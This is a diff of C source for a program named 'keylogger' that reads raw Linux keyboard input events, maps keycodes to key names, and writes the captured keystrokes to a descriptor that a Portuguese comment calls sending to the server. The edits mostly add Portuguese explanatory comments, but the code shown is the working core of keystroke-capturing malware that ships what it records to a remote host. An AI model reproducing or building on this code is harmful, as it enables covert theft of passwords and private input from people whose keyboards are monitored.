@@ -9,6 +9,7 @@
 #define BUFFER_SIZE 100
 #define NUM_KEYCODES 128
 
+// Matriz que mapeia o teclado
 const char *keycodes[] = {
     "RESERVED ",
     "ESC ",
@@ -65,7 +66,7 @@ const char *keycodes[] = {
     ".",
     ";",
     "RIGHTSHIFT ",
-    "KPASTERISK",
+    "KPASTERISK ",
     "LEFTALT ",
     "SPACE",
     "CAPSLOCK",
@@ -154,7 +155,7 @@ int write_all(int file_desc, const char *str)
 
   do
   {
-    bytesWritten = write(file_desc, str, bytesToWrite);
+    bytesWritten = write(file_desc, str, bytesToWrite); // enviando para o servidor
 
     if (bytesWritten == -1)
     {
@@ -177,7 +178,7 @@ void safe_write_all(int file_desc, const char *str, int keyboard)
 
   sigaction(SIGPIPE, &new_actn, &old_actns);
 
-  if (!write_all(file_desc, str))
+  if (!write_all(file_desc, str)) // se nao conseguiu escrever
   {
     close(file_desc);
     close(keyboard);
@@ -195,11 +196,11 @@ void keylogger(int keyboard, int writeout)
   struct input_event events[NUM_EVENTS];
   int i;
 
-  signal(SIGINT, sigint_handler);
+  signal(SIGINT, sigint_handler); // instalando um tratador para o sinal SIGINT
 
   while (loop)
   {
-    bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);
+    bytesRead = read(keyboard, events, eventSize * NUM_EVENTS); // lendo do teclado
 
     for (i = 0; i < (bytesRead / eventSize); ++i)
     {
